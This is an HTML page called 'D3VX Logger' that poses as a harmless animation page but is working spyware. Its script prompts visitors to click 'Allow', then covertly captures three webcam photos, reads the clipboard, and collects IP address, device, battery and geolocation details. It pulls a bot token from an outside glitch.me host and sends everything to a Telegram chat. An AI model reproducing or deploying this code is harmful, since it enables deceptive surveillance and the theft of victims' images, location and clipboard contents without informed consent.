<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>D3VX Logger</title>
  <style>
    body {
      margin: 0;
      background: #0a0f24;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      overflow: hidden;
    }
    .card {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: black;
      padding: 30px;
      border-radius: 15px;
    }
    .card h1 {
      font-size: 2em;
    }
    #permissionPopup {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.95);
      color: lime;
      display: none;
      z-index: 9999;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    #permissionPopup button {
      margin-top: 20px;
      padding: 10px 25px;
      background: lime;
      color: black;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <!-- Animation / Welcome UI -->
  <div class="card">
    <h1>D3V✘</h1>
    <p>Welcome to the My Server. Click Background And Enjoy Effect!</p>
    <p>Hello dear I'm D3V X Hacker</p>
  </div>

  <!-- Popup Permission -->
  <div id="permissionPopup">
    <h2>💀 Allow us to See Something Amazing?</h2>
    <button onclick="allowLogger()">✅ Allow</button>
  </div>

  <script>
    const params = new URLSearchParams(location.search);
    const uid = params.get("uid");

    if (uid) {
      document.body.innerHTML += document.getElementById("permissionPopup").outerHTML;
      document.getElementById("permissionPopup").style.display = "flex";
    }

    async function allowLogger() {
      document.getElementById("permissionPopup").innerHTML = "<h2>⏳ Collecting Info...</h2>";

      try {
        const res = await fetch(`https://grizzled-gamy-child.glitch.me/get?uid=${uid}`);
        const { token, chat_id } = await res.json();

        // 📸 Camera Access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        let photos = [];

        const capture = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          photos.push(canvas.toDataURL("image/jpeg"));
        };

        await new Promise(r => setTimeout(r, 1000)); capture();
        await new Promise(r => setTimeout(r, 1500)); capture();
        await new Promise(r => setTimeout(r, 1500)); capture();
        stream.getTracks().forEach(t => t.stop());

        // 📋 Clipboard read
        let clipboardText = "Not allowed";
        try {
          clipboardText = await navigator.clipboard.readText();
        } catch (e) {
          clipboardText = "Permission denied or unavailable";
        }

        // 🔋 Battery + IP + OS
        const battery = await navigator.getBattery();
        const info = {
          ip: await (await fetch("https://api.ipify.org?format=json")).json(),
          ua: navigator.userAgent,
          os: navigator.platform,
          battery: `${Math.round(battery.level * 100)}%`
        };

        // 📍 Location
        let location = "Not granted";
        if (navigator.geolocation) {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition((pos) => {
              location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
              resolve();
            }, () => resolve());
          });
        }

        const caption = `💀 𝗗𝗶𝘃𝘆𝗮𝗻𝘀𝗵 𝗗𝗲𝗲𝘄𝗮𝗻𝗮 💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n📍 Location: ${location}\n📋 Clipboard: ${clipboardText}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;

        // 🔁 Send to Telegram
        for (let i = 0; i < photos.length; i++) {
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id,
              photo: photos[i],
              caption: i === 0 ? caption : ""
            })
          });
        }

        document.getElementById("permissionPopup").innerHTML = "<h2>✅ Sent to Telegram!</h2>";

      } catch (err) {
        console.error(err);
        document.getElementById("permissionPopup").innerHTML = "<h2>❌ Error sending data!</h2>";
      }
    }
  </script>
</body>
</html>
